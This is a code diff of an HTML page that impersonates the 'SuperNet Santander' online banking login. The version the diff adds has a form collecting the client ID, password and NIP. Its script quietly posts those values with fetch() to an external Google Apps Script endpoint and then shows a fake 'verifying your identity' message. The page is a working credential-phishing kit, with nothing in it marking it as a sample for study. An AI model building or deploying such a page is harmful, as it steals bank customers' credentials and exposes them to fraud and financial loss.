@@ -1,116 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<meta charset="UTF-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<link rel="preconnect" href="https://fonts.googleapis.com">
-	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-	<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">  
-	<link rel="stylesheet" href="css/estilos.css">
-	<link rel="icon" href="favicon-snet.png">
-	<meta name="robots" content="noindex, nofollow">
-
-	<meta property="og:locale" content="es_ES" />
-	<meta property="og:type" content="website" />
-	<meta property="og:title" content="SuperNet Santander Acceso | La banca electrónica por internet" />
-	<meta property="og:description" content="Accede a nuestra banca electrónica por internet desde tu computadora y realiza pagos, transferencias, inversiones, consulta de estados de cuenta y más." />
-	<meta property="og:site_name" content="SuperNet Santander Acceso | La banca electrónica por internet" />
-	<meta property="og:image" content="favicon-snet.png" />
-	<meta property="og:image:width" content="1093" />
-	<meta property="og:image:height" content="666" />
-	<meta property="og:image:type" content="image/png" />
-
-	<title>SuperNet Santander Acceso | La banca electrónica por internet</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">  
+  <link rel="stylesheet" href="css/estilos.css">
+  <link rel="icon" href="favicon-snet.png">
+  <meta name="robots" content="noindex, nofollow">
+  <meta property="og:locale" content="es_ES" />
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="SuperNet Santander Acceso | La banca electrónica por internet" />
+  <meta property="og:description" content="Accede a nuestra banca electrónica por internet desde tu computadora y realiza pagos, transferencias, inversiones, consulta de estados de cuenta y más." />
+  <meta property="og:site_name" content="SuperNet Santander Acceso | La banca electrónica por internet" />
+  <meta property="og:image" content="favicon-snet.png" />
+  <meta property="og:image:width" content="1093" />
+  <meta property="og:image:height" content="666" />
+  <meta property="og:image:type" content="image/png" />
+  <title>SuperNet Santander Acceso | La banca electrónica por internet</title>
 </head>
 <body>
-	<div class="contenedor">
-		<div class="columna-top-rwd">
+  <div class="contenedor">
+    <div class="columna-top-rwd"></div>
+    <div class="columna-izquierda">
+      <div class="registro activo" id="registro">
+        <div class="header">
+          <img src="favi.png">
+          <h1>¡Bienvenido <strong>SuperNet</strong>!</h1>
+          <br>
+        </div>
+        <form class="formulario" id="contact-form" name="submit-form">
+          <p class="centro">Ingresa tus datos para identificarte</p><br>
+          <label for="nombre"></label>
+          <div class="contenedor-input">
+            <input id="nombre" name="nombre" placeholder="ID de Cliente">
+          </div>
+          <label for="pass"></label>
+          <div class="contenedor-input">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-envelope" viewBox="0 0 16 16"></svg>
+            <input type="password" id="pass" name="pass" placeholder="Contraseña ">
+          </div>
+          <label for="nip"></label>
+          <div class="contenedor-input">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-envelope" viewBox="0 0 16 16"></svg>
+            <input type="password" id="nip" name="nip" placeholder="NIP">
+          </div>
+          <div class="contenedor-boton">
+            <button type="submit" id="submit-contact-form">Enviar</button>
+          </div>
+        </form>
+      </div>
+      <div class="header exito" id="exito" style="display: none;">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-check-circle" viewBox="0 0 16 16">
+          <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/>
+          <path d="M10.97 4.97a.235.235 0 0 0-.02.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05z"/>
+        </svg>
+        <h1>Estamos verificando tu identidad</h1>
+        <p>Continua con tu asesor digital.</p>
+      </div>
+    </div>
+    <div class="columna-derecha"></div>
+  </div>
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzpw4sQMXdbK4q48Geqf_pDW6Robhkgqa8qjNN4zEoFyv86EWHrxPblaBYDCF9MLktR/exec';
+    const form = document.forms['contact-form'];
+    const exito = document.getElementById('exito'); // Obtén la referencia al elemento de éxito
 
-		</div>
-		<div class="columna-izquierda">
-			<div class="registro activo" id="registro">
-				<div class="header">
-					<img src="favi.png">
-					<h1>¡Bienvenido <strong>SuperNet</strong>!</h1>
-					<br>
-				</div>
-		
-					<form class="formulario" id="contact-form"  name="submit-form">
-						<p class="centro">Ingresa sus datos para identificarte
-						</p><br>
-						<label for="nombre"></label>
-					<div class="contenedor-input">
-											<input id="nombre" name="nombre" placeholder="ID de CLiente">
-					</div>
-		
-					<label for="correo"></label>
-					<div class="contenedor-input">
-						<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-envelope" viewBox="0 0 16 16">
-							
-						</svg>
-						<input type="password" id="pass" name="pass" placeholder="Contraseña ">
-					</div>
-					
-					<label for="correo"></label>
-					<div class="contenedor-input">
-						<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-envelope" viewBox="0 0 16 16">
-							
-						</svg>
-						<input type="password" id="nip" name="nip" placeholder="NIP">
-					</div>
-					
-		
-					<div class="contenedor-boton">
-							<button type="submit"  id="submit-contact-form" onclick="miMensaje()">
-							Enviar
-							
-						</button>
-					</div>
-				</form>
-			</div>
-
-			<div class="header exito" id="exito">
-				<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-check-circle" viewBox="0 0 16 16">
-					<path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/>
-					<path d="M10.97 4.97a.235.235 0 0 0-.02.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05z"/>
-				</svg>
-				<h1>Estamos verificando tu identidad</h1>
-				<p>Continua con tu asesor digital.</p>
-			</div>
-		</div>
-
-		<div class="columna-derecha">
-
-		</div>
-	</div>
-
-	<script>
-		function doGet() {
-  var htmlOutput = HtmlService.createHtmlOutputFromFile('formulario.html')
-    .setTitle('Formulario de Escuela')
-    .setWidth(400)
-    .setHeight(300);
-  return htmlOutput;
-}
-
-function procesarFormulario(nombre, correo) {
-  // Guardar los datos en una hoja de cálculo
-  guardarEnHojaCalculo(nombre, correo);
-}
-
-function guardarEnHojaCalculo(nombre, correo) {
-  var idHojaCalculo = "1zkIVSXtshN_DiQ37p0Nak71fOkeeNn9g9xHebPxcjEU"; // ID de la hoja de cálculo
-
-  var hojaCalculo = SpreadsheetApp.openById(idHojaCalculo);
-  var hoja = hojaCalculo.getSheets()[0]; // Tomar la primera hoja de la hoja de cálculo
-
-  // Agregar una nueva fila con el nombre y el correo
-  hoja.appendRow([nombre, correo]);
-}
-
-		</script>   
-</script>   
-
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+        .then(response => {
+          if (response.ok) {
+            // Si la respuesta es exitosa, muestra la parte de éxito y oculta el formulario
+            form.style.display = 'none';
+            exito.style.display = 'block';
+          } else {
+            console.error('Error en la respuesta:', response.status);
+          }
+        })
+        .catch(error => console.error('Error!', error.message));
+    });
+  </script>
 </body>
 </html>
+         
